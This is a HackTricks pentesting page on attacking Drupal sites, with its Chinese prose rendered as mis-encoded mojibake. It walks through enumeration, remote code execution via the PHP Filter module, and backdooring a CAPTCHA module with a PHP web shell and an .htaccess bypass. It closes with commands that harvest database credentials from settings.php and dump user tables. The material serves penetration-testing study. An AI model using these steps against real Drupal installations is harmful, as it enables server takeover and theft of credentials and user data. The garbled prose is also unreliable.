# Drupal

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## å‘ç°

* æ£€æŸ¥ **meta**æ ‡ç­¾
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **èŠ‚ç‚¹**ï¼šDrupal **ä½¿ç”¨èŠ‚ç‚¹ç´¢å¼•å…¶å†…å®¹**ã€‚èŠ‚ç‚¹å¯ä»¥**åŒ…å«ä»»ä½•å†…å®¹**ï¼Œä¾‹å¦‚åšå®¢å¸–å­ã€æŠ•ç¥¨ã€æ–‡ç« ç­‰ã€‚é¡µé¢URIé€šå¸¸æ˜¯ `/node/<nodeid>` çš„å½¢å¼ã€‚
```bash
curl drupal-site.com/node/1
```
## æšä¸¾

Drupal é»˜è®¤æ”¯æŒ**ä¸‰ç§ç±»å‹çš„ç”¨æˆ·**ï¼š

1. **`ç®¡ç†å‘˜`**ï¼šè¯¥ç”¨æˆ·å¯¹ Drupal ç½‘ç«™æ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒã€‚
2. **`è®¤è¯ç”¨æˆ·`**ï¼šè¿™äº›ç”¨æˆ·å¯ä»¥ç™»å½•ç½‘ç«™ï¼Œå¹¶æ ¹æ®ä»–ä»¬çš„æƒé™æ‰§è¡Œæ·»åŠ å’Œç¼–è¾‘æ–‡ç« ç­‰æ“ä½œã€‚
3. **`åŒ¿åç”¨æˆ·`**ï¼šæ‰€æœ‰ç½‘ç«™è®¿é—®è€…é»˜è®¤è¢«è§†ä¸ºåŒ¿åç”¨æˆ·ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™äº›ç”¨æˆ·åªè¢«å…è®¸é˜…è¯»å¸–å­ã€‚

### ç‰ˆæœ¬

* æ£€æŸ¥ `/CHANGELOG.txt`
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Drupal çš„æ–°å®‰è£…é»˜è®¤ä¼šé˜»æ­¢è®¿é—® `CHANGELOG.txt` å’Œ `README.txt` æ–‡ä»¶ã€‚
{% endhint %}

### ç”¨æˆ·åæšä¸¾

#### æ³¨å†Œ

åœ¨ _/user/register_ å°è¯•åˆ›å»ºä¸€ä¸ªç”¨æˆ·åï¼Œå¦‚æœåç§°å·²è¢«å ç”¨ï¼Œå°†ä¼šæ”¶åˆ°é€šçŸ¥ï¼š

![](<../../.gitbook/assets/image (254).png>)

#### è¯·æ±‚æ–°å¯†ç 

å¦‚æœä¸ºç°æœ‰ç”¨æˆ·åè¯·æ±‚æ–°å¯†ç ï¼š

![](<../../.gitbook/assets/image (255).png>)

å¦‚æœä¸ºä¸å­˜åœ¨çš„ç”¨æˆ·åè¯·æ±‚æ–°å¯†ç ï¼š

![](<../../.gitbook/assets/image (256).png>)

### è·å–ç”¨æˆ·æ•°é‡

è®¿é—® _/user/\<number>_ å¯ä»¥çœ‹åˆ°ç°æœ‰ç”¨æˆ·çš„æ•°é‡ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯2ï¼Œå› ä¸º _/users/3_ è¿”å›äº†æœªæ‰¾åˆ°é”™è¯¯ï¼š

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### éšè—é¡µé¢

**å¯¹ `/node/$` è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œå…¶ä¸­ `$` æ˜¯ä¸€ä¸ªæ•°å­—**ï¼ˆä¾‹å¦‚ä»1åˆ°500ï¼‰ã€‚\
ä½ å¯èƒ½ä¼šå‘ç° **éšè—é¡µé¢**ï¼ˆæµ‹è¯•ï¼Œå¼€å‘ï¼‰ï¼Œè¿™äº›é¡µé¢æ²¡æœ‰è¢«æœç´¢å¼•æ“å¼•ç”¨ã€‚

#### å·²å®‰è£…æ¨¡å—ä¿¡æ¯
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### è‡ªåŠ¨åŒ–
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### ä½¿ç”¨ PHP Filter æ¨¡å—

{% hint style="warning" %}
åœ¨Drupalçš„æ—§ç‰ˆæœ¬ä¸­ **(8ç‰ˆæœ¬ä¹‹å‰)**ï¼Œå¯ä»¥ä½œä¸ºç®¡ç†å‘˜ç™»å½•å¹¶**å¯ç”¨ `PHP filter` æ¨¡å—**ï¼Œå®ƒå…è®¸â€œè¯„ä¼°åµŒå…¥çš„PHPä»£ç /ç‰‡æ®µã€‚â€
{% endhint %}

ä½ éœ€è¦**å®‰è£… PHP æ’ä»¶**ï¼ˆé€šè¿‡è®¿é—® _/modules/php_ æ£€æŸ¥ï¼Œå¦‚æœè¿”å› **403** åˆ™è¡¨ç¤º**å­˜åœ¨**ï¼Œå¦‚æœ**æœªæ‰¾åˆ°**ï¼Œåˆ™è¡¨ç¤º**PHP æ’ä»¶æœªå®‰è£…**ï¼‰

è½¬åˆ° _Modules_ -> ï¼ˆ**å‹¾é€‰**ï¼‰_PHP Filter_ -> _Save configuration_

![](<../../.gitbook/assets/image (247) (1).png>)

ç„¶åç‚¹å‡» _Add content_ -> é€‰æ‹© _Basic Page_ æˆ– _Article_ -> åœ¨æ­£æ–‡ä¸­å†™å…¥ _php shellcode_ -> åœ¨ _Text format_ ä¸­é€‰æ‹© _PHP code_ -> é€‰æ‹© _Preview_

![](<../../.gitbook/assets/image (253) (1).png>)

æœ€ååªéœ€è®¿é—®æ–°åˆ›å»ºçš„èŠ‚ç‚¹ï¼š
```bash
curl http://drupal-site.local/node/3
```
### å®‰è£… PHP Filter æ¨¡å—

ä» **8 ç‰ˆæœ¬å¼€å§‹ï¼Œ**[**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **æ¨¡å—é»˜è®¤ä¸ä¼šå®‰è£…**ã€‚è¦ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦**è‡ªå·±å®‰è£…æ¨¡å—**ã€‚

1. ä» Drupal ç½‘ç«™ä¸‹è½½æ¨¡å—çš„æœ€æ–°ç‰ˆæœ¬ã€‚
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. ä¸‹è½½å®Œæˆåï¼Œè½¬åˆ° **`ç®¡ç†`** > **`æŠ¥å‘Š`** > **`å¯ç”¨æ›´æ–°`**ã€‚
3. ç‚¹å‡» **`æµè§ˆ`**ï¼Œé€‰æ‹©æˆ‘ä»¬ä¸‹è½½åˆ°çš„ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œç„¶åç‚¹å‡» **`å®‰è£…`**ã€‚
4. å®‰è£…æ¨¡å—åï¼Œæˆ‘ä»¬å¯ä»¥ç‚¹å‡» **`å†…å®¹`** å¹¶**åˆ›å»ºä¸€ä¸ªæ–°çš„åŸºæœ¬é¡µé¢**ï¼Œç±»ä¼¼äºæˆ‘ä»¬åœ¨ Drupal 7 ç¤ºä¾‹ä¸­æ‰€åšçš„ã€‚åŒæ ·ï¼Œç¡®ä¿ä» **`æ–‡æœ¬æ ¼å¼`** ä¸‹æ‹‰èœå•ä¸­**é€‰æ‹© `PHP ä»£ç `**ã€‚

### åé—¨æ¨¡å—

å¯ä»¥é€šè¿‡**å‘ç°æœ‰æ¨¡å—æ·»åŠ  shell** æ¥åˆ›å»ºåé—¨æ¨¡å—ã€‚å¯ä»¥åœ¨ drupal.org ç½‘ç«™ä¸Šæ‰¾åˆ°æ¨¡å—ã€‚æˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªåƒ [CAPTCHA](https://www.drupal.org/project/captcha) è¿™æ ·çš„æ¨¡å—ã€‚å‘ä¸‹æ»šåŠ¨å¹¶å¤åˆ¶ tar.gz [å­˜æ¡£](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz)çš„é“¾æ¥ã€‚

* ä¸‹è½½å­˜æ¡£å¹¶æå–å…¶å†…å®¹ã€‚
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* åˆ›å»ºä¸€ä¸ªåŒ…å«ä»¥ä¸‹å†…å®¹çš„ **PHP web shell**ï¼š
```php
<?php
system($_GET["cmd"]);
?>
```
* æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª **`.htaccess`** æ–‡ä»¶ä»¥ä¾¿æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®æ–‡ä»¶å¤¹ã€‚è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºDrupalæ‹’ç»ç›´æ¥è®¿é—® **`/modules`** æ–‡ä»¶å¤¹ã€‚
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* ä¸Šè¿°é…ç½®å°†åœ¨æˆ‘ä»¬è¯·æ±‚ /modules ä¸­çš„æ–‡ä»¶æ—¶ï¼Œä¸º / æ–‡ä»¶å¤¹åº”ç”¨è§„åˆ™ã€‚å¤åˆ¶è¿™ä¸¤ä¸ªæ–‡ä»¶åˆ° captcha æ–‡ä»¶å¤¹å¹¶åˆ›å»ºä¸€ä¸ªå­˜æ¡£ã€‚
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* å‡è®¾æˆ‘ä»¬æ‹¥æœ‰ç½‘ç«™çš„**ç®¡ç†å‘˜è®¿é—®æƒé™**ï¼Œç‚¹å‡»ä¾§è¾¹æ çš„ **`ç®¡ç†`** ç„¶å **`æ‰©å±•`**ã€‚æ¥ä¸‹æ¥ï¼Œç‚¹å‡» **`+ å®‰è£…æ–°æ¨¡å—`** æŒ‰é’®ï¼Œæˆ‘ä»¬å°†è¢«å¸¦åˆ°å®‰è£…é¡µé¢ï¼Œä¾‹å¦‚ `http://drupal-site.local/admin/modules/install` æµè§ˆåˆ°å¸¦åé—¨çš„Captchaå­˜æ¡£å¹¶ç‚¹å‡» **`å®‰è£…`**ã€‚
* å®‰è£…æˆåŠŸåï¼Œæµè§ˆåˆ° **`/modules/captcha/shell.php`** æ¥æ‰§è¡Œå‘½ä»¤ã€‚

## åæœŸåˆ©ç”¨

### è¯»å– settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### ä»æ•°æ®åº“ä¸­å¯¼å‡ºç”¨æˆ·
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## å‚è€ƒèµ„æ–™

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
